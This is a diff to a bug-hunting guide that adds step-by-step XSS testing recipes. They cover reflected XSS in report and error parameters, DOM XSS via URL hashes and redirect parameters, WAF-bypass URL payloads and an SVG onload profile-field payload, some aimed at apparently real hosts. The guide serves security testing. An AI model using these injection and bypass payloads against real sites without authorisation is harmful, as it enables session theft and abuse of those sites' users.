@@ -99,35 +99,185 @@ Repeat with the alternative payload examples from the report (iframe-based spoof
 
 ***
 
-####
+#### Reflected XSS In Marketing Reports Page
 
 {% stepper %}
 {% step %}
-Go to another users profile
+Log in to the store's website and complete the authentication process
 {% endstep %}
 
 {% step %}
-Click private message
+Then go to the report section in your profile
 {% endstep %}
 
 {% step %}
-Type any subject
+When you enter the page, check the URL and find parameters like `return_page_pathname=` (may be different in each site)
 {% endstep %}
 
 {% step %}
-Type the following message `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
+Inject the parameter using the following payload and check if the code is executed or not
+
+```
+javascript:alert('XSS')
+```
 {% endstep %}
 
 {% step %}
-Send the message
+If it is implemented, we hit a vulnerability
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Reflected cross site scripting (XSS) attacks
+
+{% stepper %}
+{% step %}
+Enter a site and complete the authentication process
 {% endstep %}
 
 {% step %}
-View the message (triggers the XSS)
+In the authentication process, make an error on one of the parameters so that the authentication process fails
 {% endstep %}
 
 {% step %}
-Wait for the victim to read the message
+If you encounter errmssg parameters in subsequent requests, inject xss-related payloads in these parameters
+{% endstep %}
+
+{% step %}
+For example, like this request below
+
+```
+errmsg = [https://102.176.160.119:10443/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E]
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### DOM XSS
+
+{% stepper %}
+{% step %}
+Bring up the Burp tool and make a request to the main page of the site
+{% endstep %}
+
+{% step %}
+In the Response section, click on the search section and search for the word `window.location.hash` and check if it exists or not
+{% endstep %}
+
+{% step %}
+If there is, inject the payload as shown below and see if it is reflected or not
+
+```
+https://www.example.com/#<img src=x onerror=alert('XSS')>
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### DOMXSS in redirect param
+
+{% stepper %}
+{% step %}
+Logout website
+{% endstep %}
+
+{% step %}
+Get the request using Burp and check the request
+{% endstep %}
+
+{% step %}
+In the requests review, if you find a request like the one below, inject the payload
+
+```
+https://subdomain.example.net/?redirect=javascript:prompt(document.domain)%2f%2f 
+```
+{% endstep %}
+
+{% step %}
+Log in through email
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### XSS Reflected in Redirect\_url
+
+{% stepper %}
+{% step %}
+Log in to the site and complete the registration process
+{% endstep %}
+
+{% step %}
+Trace the registration process using Burp and inspect the parameters
+{% endstep %}
+
+{% step %}
+If you see a parameter called redirect\_url, inject the following payload as shown below:
+
+```http
+https://example.net/resign_request/success?next_url=javascript%3Aalert%2F**%2F(document.domain)
+```
+{% endstep %}
+
+{% step %}
+If the code is reflected, the vulnerability has occurred
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Payload For WAF Bypass
+
+{% stepper %}
+{% step %}
+```http
+https://www.example.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
+```
+{% endstep %}
+
+{% step %}
+```http
+https://www.example.com.br/testing%2522%FF%2520accesskey='x'%2520onclick='confirm%601%60'
+```
+{% endstep %}
+
+{% step %}
+```http
+https://www.starbucks.com.br/testing%80%2522%2520accesskey='x'%2520onclick='confirm%601%60'
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Location Information Parameter&#x20;
+
+{% stepper %}
+{% step %}
+Log in to your account and profile on the target site
+{% endstep %}
+
+{% step %}
+Go to the general section of your account and enter the street address, city, and the following payload
+
+```javascript
+/"><!--><svg/onload=alert(document.domain)>)
+```
+{% endstep %}
+
+{% step %}
+After injection, save and log in to see your location information and live view
+{% endstep %}
+
+{% step %}
+For example, something like the path below (keep in mind that this path can be different for each site)
+
+```http
+https://example.com/user/dashboards/live
+```
 {% endstep %}
 {% endstepper %}
 
